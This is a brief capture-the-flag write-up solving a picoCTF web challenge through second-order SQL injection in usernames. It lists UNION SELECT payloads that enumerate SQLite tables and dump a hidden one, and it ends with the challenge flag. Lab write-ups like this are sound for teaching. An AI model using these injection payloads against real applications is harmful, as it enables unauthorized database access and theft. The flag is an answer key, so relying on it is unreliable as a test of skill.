```md

Putting a random ' in the username gives an error while generating report
The error seems to be from sqlite

Probable UNION query injection

try creating user with username:

`' --`               Gives a csv with names of columns on LHS

Thus, there are 3 columns on the left side of the union

WHY: Because UNION requires same number of columns on both sides otherwise its an error

Create an account with username

`' UNION SELECT NULL,NULL,name FROM sqlite_master --`

WHY: Because the sqlite_master table by default contains the tablenames

Generate report and download the csv to get all table names

Interesting tablename:

`aDNyM19uMF9mMTRn`

Base64: 

`h3r3_n0_f14g`

Trying to read from that table:
Create a user with the following username and generate report

`' UNION SELECT *,NULL FROM aDNyM19uMF9mMTRn --`

Flag obtained:

`picoCTF{s3c0nd_0rd3r_1t_1s_97d307ce}`
